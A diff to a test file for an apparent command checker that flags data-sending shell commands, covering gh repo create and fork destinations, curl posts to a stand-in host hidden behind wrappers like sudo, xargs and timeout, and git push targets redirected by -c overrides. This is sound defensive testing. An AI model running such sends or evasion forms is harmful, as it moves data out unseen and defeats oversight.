@@ -449,22 +449,87 @@ describe('CC checkpoint findings: curl targets, clusters, and unwrapping', () =>
       rule: 'gh-write', verdict: 'violation', destination: 'github:acme/new-repo',
     })
     expect(verdictOf('gh repo create new-repo')).toEqual({
-      rule: 'gh-write', verdict: 'violation', destination: 'github:new-repo',
+      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account/new-repo",
     })
     expect(verdictOf('gh repo fork')).toEqual({
-      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account",
+      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account/the source name",
     })
     expect(verdictOf('gh repo fork --clone=false')).toEqual({
-      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account",
+      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account/the source name",
     })
+    // The source's owner never carries over: only its name, as the fork's.
     expect(verdictOf('gh repo fork other/repo')).toEqual({
-      rule: 'gh-write', verdict: 'violation', destination: 'github:other/repo',
+      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account/repo",
     })
     expect(verdictOf('gh gist create notes.md')).toEqual({
       rule: 'gh-write', verdict: 'violation', destination: 'host:gist.github.com',
     })
     expect(verdictOf('gh gist edit abc123 -f notes.md')).toEqual({
       rule: 'gh-write', verdict: 'violation', destination: 'host:gist.github.com',
+    })
+  })
+})
+
+describe('CC round 3: wrappers, reserved words, and git pinning', () => {
+  test('reserved words and wrappers with options no longer hide the send', () => {
+    const cases: Array<[string, string]> = [
+      ['xargs -t curl -d x https://host.example.org/hook', 'host:host.example.org'],
+      ['if curl -d x https://host.example.org/hook; then echo ok; fi', 'host:host.example.org'],
+      ['while true; do curl -d x https://host.example.org/hook; done', 'host:host.example.org'],
+      ['! curl -d x https://host.example.org/hook', 'host:host.example.org'],
+      ['time curl -d x https://host.example.org/hook', 'host:host.example.org'],
+      ['sudo -u bob curl -d x https://host.example.org/hook', 'host:host.example.org'],
+      ['timeout -s KILL 5 curl -d x https://host.example.org/hook', 'host:host.example.org'],
+      ['timeout 5s curl -d x https://host.example.org/hook', 'host:host.example.org'],
+      ['nice -n 5 curl -d x https://host.example.org/hook', 'host:host.example.org'],
+      ['stdbuf -oL curl -d x https://host.example.org/hook', 'host:host.example.org'],
+      ['ionice -c3 curl -d x https://host.example.org/hook', 'host:host.example.org'],
+    ]
+    for (const [command, destination] of cases) {
+      expect(verdictOf(command)).toMatchObject({ rule: 'http-send', verdict: 'violation', destination })
+    }
+  })
+
+  test('sudo -E keeps the git push, and a wrapper flag nobody knows reads unknown', () => {
+    expect(verdictOf('sudo -E git push fork')).toMatchObject({ rule: 'git-push' })
+    expect(verdictOf('sudo -Z curl -d x https://host.example.org/hook')).toEqual({
+      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:the sudo options were not understood',
+    })
+    expect(verdictOf('xargs --strange-flag curl -d x https://host.example.org/hook')).toEqual({
+      rule: 'http-send', verdict: 'unknown-destination', destination: 'unresolved:the xargs options were not understood',
+    })
+  })
+
+  test('git -c overrides and config env pin the target, case-insensitively', () => {
+    for (const command of [
+      'git -c branch.main.pushRemote=fork push',
+      'git -c Remote.origin.pushurl=https://github.com/other/repo.git push',
+      'git -c url.https://github.com/.insteadOf=https://example.internal/ push',
+      'git --config-env=GIT_AUTHOR_NAME.env_var push',
+    ]) {
+      expect(verdictOf(command)).toEqual({
+        rule: 'git-push',
+        verdict: 'unknown-destination',
+        destination: /config-env/.test(command) ? 'unresolved:git --config-env pins the target' : 'unresolved:a git -c override pins the target',
+      })
+    }
+    expect(verdictOf('GIT_CONFIG_COUNT=2 git push')).toMatchObject({
+      rule: 'git-push', verdict: 'unknown-destination',
+    })
+    expect(verdictOf('GIT_CONFIG_PARAMETERS=remote.origin.url=x git push')).toMatchObject({
+      rule: 'git-push', verdict: 'unknown-destination',
+    })
+  })
+
+  test('gh repo create value flags are never read as the name', () => {
+    expect(verdictOf('gh repo create -d "A repo" -t core-team new-repo')).toEqual({
+      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account/new-repo",
+    })
+    expect(verdictOf('gh repo fork --org acme other/kawai')).toEqual({
+      rule: 'gh-write', verdict: 'violation', destination: 'github:acme/kawai',
+    })
+    expect(verdictOf('gh repo fork --fork-name kawai-two acme/kawai')).toEqual({
+      rule: 'gh-write', verdict: 'violation', destination: "github:the caller's account/kawai-two",
     })
   })
 })
